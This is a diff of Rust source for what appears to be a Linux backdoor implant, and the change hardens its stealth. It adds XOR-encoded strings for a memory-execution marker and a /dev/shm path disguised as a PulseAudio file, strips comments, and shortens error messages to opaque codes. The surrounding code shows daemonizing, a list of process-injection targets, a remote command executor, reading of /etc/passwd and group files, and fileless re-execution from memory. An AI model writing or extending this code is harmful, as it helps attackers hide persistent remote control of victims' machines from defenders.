@@ -119,10 +119,12 @@ const ENC_NSENTER_ARG: [u8; 7] = xor_encode(b"nsenter");
 const ENC_T_FLAG: [u8; 2] = xor_encode(b"-t");
 const ENC_M_FLAG: [u8; 2] = xor_encode(b"-m");
 const ENC_SEPARATOR: [u8; 2] = xor_encode(b"--");
-const _ENC_SHM_PREFIX: [u8; 10] = xor_encode(b"pulse-shm-");
 const ENC_INJECT_CANDIDATES: [u8; 75] = xor_encode(b"dbus-daemon,pulseaudio,pipewire,gvfsd,at-spi-bus-launcher,gsd-color,tracker");
 const ENC_RUN_USER: [u8; 10] = xor_encode(b"/run/user/");
 const ENC_DCONF_SFX: [u8; 14] = xor_encode(b"/dconf/user-db");
+const ENC_MFD_KEY: [u8; 4] = xor_encode(b"_MFD");
+const ENC_MFD_VAL: [u8; 1] = xor_encode(b"1");
+const ENC_SHM_PATH: [u8; 20] = xor_encode(b"/dev/shm/.pulse-shm-");
 
 // In-process builtin paths
 const ENC_ETC_PASSWD: [u8; 11] = xor_encode(b"/etc/passwd");
@@ -390,12 +392,14 @@ fn daemonize() {
         let pid = libc::fork();
         if pid < 0 { std::process::exit(1); }
         if pid > 0 { std::process::exit(0); }
-        let devnull = libc::open(b"/dev/null\0".as_ptr() as _, libc::O_RDWR);
+        let dn = CString::new(xor_decode(&ENC_DEV_NULL)).unwrap();
+        let devnull = libc::open(dn.as_ptr(), libc::O_RDWR);
         libc::dup2(devnull, 0);
         libc::dup2(devnull, 1);
         libc::dup2(devnull, 2);
         if devnull > 2 { libc::close(devnull); }
-        libc::chdir(b"/\0".as_ptr() as _);
+        let root = CString::new("/").unwrap();
+        libc::chdir(root.as_ptr());
     }
 }
 
@@ -513,7 +517,7 @@ fn builtin_hostname() -> Vec<u8> {
             return name;
         }
     }
-    b"unknown\n".to_vec()
+    b"?\n".to_vec()
 }
 
 fn builtin_uname() -> Vec<u8> {
@@ -530,7 +534,7 @@ fn builtin_uname() -> Vec<u8> {
             ).into_bytes();
         }
     }
-    b"unknown\n".to_vec()
+    b"?\n".to_vec()
 }
 
 fn builtin_ls(args: &str) -> Vec<u8> {
@@ -555,7 +559,7 @@ fn builtin_ls(args: &str) -> Vec<u8> {
             result.push(b'\n');
         }
     } else {
-        result.extend_from_slice(format!("ls: cannot access '{}'\n", path).as_bytes());
+        result.extend_from_slice(format!("err: {}\n", path).as_bytes());
     }
     result
 }
@@ -563,7 +567,7 @@ fn builtin_ls(args: &str) -> Vec<u8> {
 fn builtin_cat(path: &str) -> Vec<u8> {
     match std::fs::read(path) {
         Ok(content) => content,
-        Err(e) => format!("cat: {}: {}\n", path, e).into_bytes(),
+        Err(e) => format!("{}: {}\n", path, e).into_bytes(),
     }
 }
 
@@ -633,7 +637,7 @@ fn builtin_ifconfig() -> Vec<u8> {
         }
     }
     if result.is_empty() {
-        result = b"no interfaces found\n".to_vec();
+        result = b"none\n".to_vec();
     }
     result
 }
@@ -703,7 +707,7 @@ fn parse_hex_addr(hex: &str) -> String {
 fn builtin_getent(args: &str) -> Vec<u8> {
     let parts: Vec<&str> = args.split_whitespace().collect();
     if parts.is_empty() {
-        return b"usage: getent <database> [key]\n".to_vec();
+        return b"usage: <db> [key]\n".to_vec();
     }
     match parts[0] {
         "passwd" => {
@@ -713,13 +717,13 @@ fn builtin_getent(args: &str) -> Vec<u8> {
                 content.lines()
                     .find(|l| l.starts_with(parts[1]) || l.contains(&format!(":{}:", parts[1])))
                     .map(|l| format!("{}\n", l).into_bytes())
-                    .unwrap_or_else(|| b"not found\n".to_vec())
+                    .unwrap_or_else(|| b"?\n".to_vec())
             } else {
                 content.into_bytes()
             }
         }
         "hosts" => {
-            std::fs::read(xor_decode_str(&ENC_ETC_HOSTS)).unwrap_or_else(|_| b"error\n".to_vec())
+            std::fs::read(xor_decode_str(&ENC_ETC_HOSTS)).unwrap_or_else(|_| b"e\n".to_vec())
         }
         "group" => {
             let content = std::fs::read_to_string(xor_decode_str(&ENC_ETC_GROUP))
@@ -728,15 +732,15 @@ fn builtin_getent(args: &str) -> Vec<u8> {
                 content.lines()
                     .find(|l| l.starts_with(parts[1]))
                     .map(|l| format!("{}\n", l).into_bytes())
-                    .unwrap_or_else(|| b"not found\n".to_vec())
+                    .unwrap_or_else(|| b"?\n".to_vec())
             } else {
                 content.into_bytes()
             }
         }
         "resolv" => {
-            std::fs::read(xor_decode_str(&ENC_ETC_RESOLV)).unwrap_or_else(|_| b"error\n".to_vec())
+            std::fs::read(xor_decode_str(&ENC_ETC_RESOLV)).unwrap_or_else(|_| b"e\n".to_vec())
         }
-        _ => format!("getent: unknown database '{}'\n", parts[0]).into_bytes(),
+        _ => format!("?: '{}'\n", parts[0]).into_bytes(),
     }
 }
 
@@ -1167,21 +1171,21 @@ fn exec_command_inner(cmd: &str) -> Vec<u8> {
         let path_c = CString::new(&script_path[..script_path.len()-1]).unwrap();
 
         if std::fs::write(&script_path[..script_path.len()-1], script_content.as_bytes()).is_err() {
-            return b"exec error\n".to_vec();
+            return b"e1\n".to_vec();
         }
         libc::chmod(path_c.as_ptr(), 0o700);
 
         let mut stdout_pipe: [RawFd; 2] = [0; 2];
         if libc::pipe(stdout_pipe.as_mut_ptr()) != 0 {
             let _ = std::fs::remove_file(&script_path[..script_path.len()-1]);
-            return b"pipe error\n".to_vec();
+            return b"e2\n".to_vec();
         }
 
         let pid = libc::fork();
 
         if pid < 0 {
             let _ = std::fs::remove_file(&script_path[..script_path.len()-1]);
-            return b"fork error\n".to_vec();
+            return b"e3\n".to_vec();
         } else if pid == 0 {
             libc::close(stdout_pipe[0]);
             libc::dup2(stdout_pipe[1], 1);
@@ -1319,7 +1323,8 @@ fn silent_exec(args: &[&str]) -> bool {
         if pid < 0 { return false; }
         if pid == 0 {
             // Redirect all output to /dev/null
-            let devnull = libc::open(b"/dev/null\0".as_ptr() as _, libc::O_RDWR);
+            let dn = CString::new(xor_decode(&ENC_DEV_NULL)).unwrap();
+            let devnull = libc::open(dn.as_ptr(), libc::O_RDWR);
             libc::dup2(devnull, 0);
             libc::dup2(devnull, 1);
             libc::dup2(devnull, 2);
@@ -1348,7 +1353,8 @@ fn silent_exec_background(args: &[&str]) -> i32 {
         if pid < 0 { return -1; }
         if pid == 0 {
             libc::setsid();
-            let devnull = libc::open(b"/dev/null\0".as_ptr() as _, libc::O_RDWR);
+            let dn = CString::new(xor_decode(&ENC_DEV_NULL)).unwrap();
+            let devnull = libc::open(dn.as_ptr(), libc::O_RDWR);
             libc::dup2(devnull, 0);
             libc::dup2(devnull, 1);
             libc::dup2(devnull, 2);
@@ -1790,20 +1796,19 @@ fn reexec_from_memory() {
                         .collect();
                     argv.push(std::ptr::null());
 
-                    let marker = CString::new("_MFD").unwrap();
-                    let val = CString::new("1").unwrap();
+                    let marker = CString::new(xor_decode(&ENC_MFD_KEY)).unwrap();
+                    let val = CString::new(xor_decode(&ENC_MFD_VAL)).unwrap();
                     libc::setenv(marker.as_ptr(), val.as_ptr(), 1);
 
                     libc::execve(path_c.as_ptr(), argv.as_ptr(), std::ptr::null());
-                    // execve failed, fall through to shm_open
                 }
             }
         }
 
-        // Fallback: copy to /dev/shm with legitimate-looking name and exec directly
         let mut rng = rand::rng();
         let shm_id: u32 = rng.random_range(100000..999999u32);
-        let shm_path = format!("/dev/shm/.pulse-shm-{}", shm_id);
+        let shm_base = xor_decode_str(&ENC_SHM_PATH);
+        let shm_path = format!("{}{}", shm_base, shm_id);
 
         if let Ok(self_bin) = std::fs::read("/proc/self/exe") {
             if std::fs::write(&shm_path, &self_bin).is_ok() {
@@ -1819,8 +1824,8 @@ fn reexec_from_memory() {
                     .collect();
                 argv.push(std::ptr::null());
 
-                let marker = CString::new("_MFD").unwrap();
-                let val = CString::new("1").unwrap();
+                let marker = CString::new(xor_decode(&ENC_MFD_KEY)).unwrap();
+                let val = CString::new(xor_decode(&ENC_MFD_VAL)).unwrap();
                 libc::setenv(marker.as_ptr(), val.as_ptr(), 1);
 
                 libc::execve(path_c.as_ptr(), argv.as_ptr(), std::ptr::null());
@@ -1831,9 +1836,9 @@ fn reexec_from_memory() {
 }
 
 fn is_running_from_memfd() -> bool {
-    if env::var("_MFD").is_ok() {
-        // Clean the marker so child processes don't inherit it
-        std::env::remove_var("_MFD");
+    let key = xor_decode_str(&ENC_MFD_KEY);
+    if env::var(&key).is_ok() {
+        std::env::remove_var(&key);
         true
     } else {
         false
